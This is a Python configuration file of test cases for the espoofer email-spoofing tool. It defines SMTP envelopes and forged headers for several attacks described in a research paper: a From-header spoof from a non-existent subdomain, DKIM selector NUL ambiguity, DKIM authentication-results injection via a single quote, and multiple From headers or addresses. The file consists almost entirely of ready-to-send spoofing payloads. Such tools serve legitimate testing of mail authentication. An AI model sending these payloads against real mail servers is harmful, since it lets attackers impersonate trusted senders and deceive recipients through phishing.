from common.common import *
import config

# Important note:
#
# For server mode, all case_id should start with 'server_'.  All of attack.com, admin@legitimate.com, and victim@victim.com in thos cases will be replaced with the configured value in config.py.
# 
# For client mode, all case_id should start with 'client_'. attacker@example.com and admin@example.com in those cases will be replaced.
#

test_cases = {
    "server_a1": {
        "helo": b"attack.com",
        "mailfrom": b"<admin@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
            "body": b"",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b"Content-Type: multipart/mixed;\r\n\tboundary=\"----=_Part_111217_462031992.1680524601073\"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-" + id_generator() + b"@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n",
        },
        "description": b"Simple From header spoof. Edited by anjhz."
    },
    "server_a3": {
        "helo": b"attack.com",
        "mailfrom": b"<admin@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b"legitimate.com", "s":b"selector._domainkey.attack.com.\x00.any", "sign_header": b"From: <root@legitimate.com>"},
        "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A3: NUL ambiguity\r\n",
            "body": b'',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"NUL ambiguity, refer to A3 attack in the paper."
    },
    "server_a4": {
        "helo": b"attack.com",
        "mailfrom": b"<admin@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "dkim_para": {"d":b"attack.com", "s":b"default", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A4: DKIM authentication results injection using single quote\r\n",
            "body": b'',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"DKIM authentication results injection using single quote, refer to A4 attack in the paper."
    },
    


    "client_a1": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>\r\nFrom: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A1: Multiple From headers\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple From headers, refer to section 6.2 in the paper."
    },   
    "client_a2": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>, <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A2: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple address, refer to section 6.2 in the paper."
    },
    "client_a3": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account, refer to section 6.2 in the paper."
    },
}
